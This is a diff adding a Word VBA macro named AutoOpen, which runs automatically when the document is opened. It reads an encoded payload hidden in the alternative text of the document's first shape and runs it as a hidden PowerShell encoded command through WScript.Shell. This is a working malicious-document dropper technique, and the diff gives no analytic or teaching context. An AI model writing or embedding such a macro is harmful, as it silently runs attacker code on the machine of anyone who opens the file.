@@ -1,0 +1,13 @@
+Sub AutoOpen()
+
+Dim val as String
+Dim ws as Object
+
+val = ActiveDocument.Shapes(1).AlternativeText
+
+Set ws = CreateObject("WScript.Shell")
+    
+cmd = "powershell.exe -nop -WindowStyle hidden -encodedCommand " + val
+ws.Exec(cmd)
+
+End Sub
